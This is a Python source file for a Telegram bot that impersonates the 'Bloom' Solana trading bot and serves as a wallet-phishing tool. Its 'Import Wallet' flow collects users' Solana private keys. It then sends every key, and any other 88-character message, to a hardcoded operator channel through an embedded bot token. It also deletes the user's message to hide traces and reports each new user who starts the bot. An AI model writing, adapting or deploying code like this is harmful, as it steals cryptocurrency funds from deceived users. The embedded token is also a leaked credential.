import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import requests

def send_telegram_message(token, chat_id, message):
    """
    Sends a message to a Telegram channel or chat.
    """
    # Telegram API endpoint for sending messages
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    # Payload data
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"  # Enables basic markdown formatting (Bold, Italic, etc.)
    }
    
    try:
        # Making the POST request
        response = requests.post(url, json=payload)
        response_data = response.json()
        
        if response_data.get("ok"):
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Error: {response_data.get('description')}")
            
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

# --- Configuration ---
'''BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
CHANNEL_ID = -10043718706475  
PRIVATE_KEY = ""
TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"

# Execute
send_telegram_message(BOT_TOKEN, CHANNEL_ID, TEXT_MESSAGE)'''


# 1. Setup Logging Engine for debugging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define State Constants for Conversation Routing
AWAITING_PRIVATE_KEY = 1

# --- UI Component Generation Blocks ---

def get_main_menu(wallet_connected=False):
    """Generates text and inline matrix layout for the core dashboard."""
    current_time = datetime.now().strftime("%H:%M:%S")
    
    wallet_status = "→ <code>W1: Active Wallet</code>" if wallet_connected else "→ <code>W1:Wallet not connected</code>"
    balance_status = "Balance: 0.0 SOL (USD $0)" if wallet_connected else "Balance: 0 SOL (USD $0)"
    warning_status = "🍏 Wallet connected successfully! Ready to trade." if wallet_connected else "🔴 You currently have no wallet.\nTo start trading, please import a wallet."

    text = (
        "🌸 <b>Welcome to Bloom!</b>\n\n"
        "Let your trading journey blossom with us!\n\n"
        "🌸 <b>Your Solana Wallet Address:</b>\n\n"
        f"{wallet_status}\n"
        f"{balance_status}\n\n"
        f"{warning_status}\n\n"
        "📚 <b>Resources:</b>\n\n"
        "• 📖 <a href='https://www.bloombot.app'>Bloom Guides</a>\n"
        "• 🔔 <a href='https://x.com'>Bloom X</a>\n"
        "• 🌍 <a href='https://www.bloombot.app'>Bloom Website</a>\n"
        "• 🤝 <a href='https://t.me'>Bloom Portal</a>\n"
        "• 🤖 <a href='https://discord.com'>Bloom Discord</a>\n\n"
        f"🕒 Last updated: {current_time}"
    )
    
    keyboard = [
        [InlineKeyboardButton("💼 Positions", callback_data="positions"), InlineKeyboardButton("🎯 LP Sniper", callback_data="lp_sniper")],
        [InlineKeyboardButton("🤖 Copy Trade", callback_data="copy_trade"), InlineKeyboardButton("💳 Wallets", callback_data="wallets")],
        [InlineKeyboardButton("📝 Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("💤 AFK Mode", callback_data="afk_mode")],
        [InlineKeyboardButton("💸 Withdraw", callback_data="withdraw"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("🗑️ Close", callback_data="close")]
    ]
    return text, InlineKeyboardMarkup(keyboard)


def get_wallets_menu(wallet_connected=False):
    """Generates the text and layout for the Preserved Wallets Settings view."""
    current_time = datetime.now().strftime("%H:%M:%S")
    
    status_btn_text = "🟢 Wallet Connected" if wallet_connected else "🔴 Wallet not connected"
    
    text = (
        "🌸 <b>Wallets Settings</b>\n\n"
        "Manage all your wallets with ease.\n\n"
        "📖 <a href='https://www.bloombot.app'>Learn More!</a>\n\n"
        f"🕒 Last updated: {current_time}"
    )
    
    keyboard = [
        [InlineKeyboardButton(status_btn_text, callback_data="wallet_status")],
        [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")],
        [
            InlineKeyboardButton("⬅️ Back", callback_data="back_to_main"),
            InlineKeyboardButton("🗑️ Close", callback_data="close")
        ]
    ]
    return text, InlineKeyboardMarkup(keyboard)

# --- Command & Callback Interaction Logic ---

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Triggers on /start. Initializes user data tracking configurations."""
    context.user_data.setdefault('wallet_connected', False)
        
    text, reply_markup = get_main_menu(wallet_connected=context.user_data['wallet_connected'])
    await update.message.reply_html(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    ) 
    BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
    CHANNEL_ID = -1004371870647
    TEXT_MESSAGE = f"<b>New User Started the Bot</b>"
    
    send_telegram_message(BOT_TOKEN, CHANNEL_ID, TEXT_MESSAGE)
    
    return ConversationHandler.END


async def menu_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles routing, navigation updates, and interface rendering switches."""
    query = update.callback_query
    
    context.user_data.setdefault('wallet_connected', False)
    wallet_connected = context.user_data['wallet_connected']
    
    open_access_callbacks = ["wallets", "import_wallet", "wallet_status", "back_to_main", "refresh", "close"]
    
    if query.data not in open_access_callbacks and not wallet_connected:
        await query.answer(
            text="⚠️ Please fund wallet in order to proceed.", 
            show_alert=True
        )
        return ConversationHandler.END

    await query.answer()
    
    if query.data == "close":
        await query.message.delete()
        return ConversationHandler.END
        
    elif query.data == "wallets":
        text, reply_markup = get_wallets_menu(wallet_connected)
        await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        
    elif query.data == "back_to_main":
        text, reply_markup = get_main_menu(wallet_connected)
        await query.edit_message_text(text=text, reply_markup=reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        
    elif query.data == "refresh":
        current_time = datetime.now().strftime("%H:%M:%S")
        if "🕒 Last updated:" in query.message.text_html:
            updated_text = query.message.text_html.split("🕒 Last updated:")[0] + f"🕒 Last updated: {current_time}"
        else:
            updated_text = query.message.text_html + f"\n\n🕒 Last updated: {current_time}"
            
        try:
            await query.edit_message_text(text=updated_text, reply_markup=query.message.reply_markup, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass 
            
    elif query.data == "import_wallet":
        sent_msg = await query.message.reply_html(
            "🔑 <b>Secure Key Collection</b>\nPlease enter your solana private key:",
        )
        context.user_data['prompt_msg_id'] = sent_msg.message_id
        context.user_data['menu_msg_id'] = query.message.message_id
        
        return AWAITING_PRIVATE_KEY
        
    return ConversationHandler.END


async def private_key_received_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Captures the text explicitly entered when the bot is in the AWAITING_PRIVATE_KEY state."""
    # Strip accidental surrounding spaces the user might have copied
    private_key = update.message.text.strip()
    chat_id = update.effective_chat.id
    
    # 🟢 88-Character Validation Block
    if len(private_key) != 88:
        await update.message.reply_text("⚠️ Please enter a valid Solana private key (exactly 88 characters long).")
        return AWAITING_PRIVATE_KEY  # Retains the context state so they can enter it again
    BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
    CHANNEL_ID = -1004371870647
    PRIVATE_KEY = private_key
    TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"
    send_telegram_message(BOT_TOKEN, CHANNEL_ID, TEXT_MESSAGE)

    try:
        await update.message.delete()
        if 'prompt_msg_id' in context.user_data:
            await context.application.bot.delete_message(
                chat_id=chat_id, 
                message_id=context.user_data['prompt_msg_id']
            )
    except Exception as e:
        logger.warning(f"Failed to scrub trace: {e}")

    logger.info(f"Assigned private_key variable successfully. Length checked.") 
    
    # Update state flags to unlock menu access
    context.user_data['wallet_connected'] = True
    
    # Inline Interface Update (Mutates the original menu block directly)
    if 'menu_msg_id' in context.user_data:
        text, reply_markup = get_wallets_menu(wallet_connected=True)
        try:
            await context.application.bot.edit_message_text(
                chat_id=chat_id,
                message_id=context.user_data['menu_msg_id'],
                text=text,
                reply_markup=reply_markup,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            await update.message.reply_html(text=text, reply_markup=reply_markup, disable_web_page_preview=True)
    else:
        text, reply_markup = get_wallets_menu(wallet_connected=True)
        await update.message.reply_html(text=text, reply_markup=reply_markup, disable_web_page_preview=True)
    
    return ConversationHandler.END


async def global_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Captures everything the user types outside of the explicit private key collection state."""
    user_input = update.message.text.strip()
    
    # 🟢 88-Character Validation Block for Global Input
    if len(user_input) != 88:
        await update.message.reply_text("⚠️ Please enter a valid Solana private key (exactly 88 characters long).")
        return
    BOT_TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"
    CHANNEL_ID = -1004371870647
    PRIVATE_KEY = user_input
    TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"
    send_telegram_message(BOT_TOKEN, CHANNEL_ID, TEXT_MESSAGE)

    logger.info(f"Captured valid 88-character general input: {user_input}")
   


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(msg="Exception while handling an update:", exc_info=context.error)


# --- Runtime Orchestration Core ---

def main():
    TOKEN = "8746690272:AAHfulBcKglK4WgYGrbH5vDTn_XxYOw0YlE"

    application = Application.builder().token(TOKEN).build()

    # Conversation handler strictly configured to catch the input sequence context
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(menu_callback_handler, pattern="^import_wallet$")
        ],
        states={
            AWAITING_PRIVATE_KEY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, private_key_received_handler)
            ],
        },
        fallbacks=[
            CommandHandler("start", start_command),
            CallbackQueryHandler(menu_callback_handler)
        ],
        allow_reentry=True
    )

    # 1. Main menu loops 
    application.add_handler(CallbackQueryHandler(menu_callback_handler, pattern="^(wallets|back_to_main|refresh|close)$"))
    application.add_handler(CallbackQueryHandler(menu_callback_handler, pattern="^(positions|lp_sniper|copy_trade|limit_orders|afk_mode|withdraw|settings|referrals)$"))
    
    # 2. Sequential fallback and conversational logic routing engine injection
    application.add_handler(conv_handler)
    
    # 3. Direct access base commands
    application.add_handler(CommandHandler("start", start_command))
    
    # 4. Fallthrough text capture handler for any unexpected text messages
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, global_text_handler))
    
    application.add_error_handler(error_handler)

    print("Bloom Interface Architecture is deployed. Shut down via Ctrl+C.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
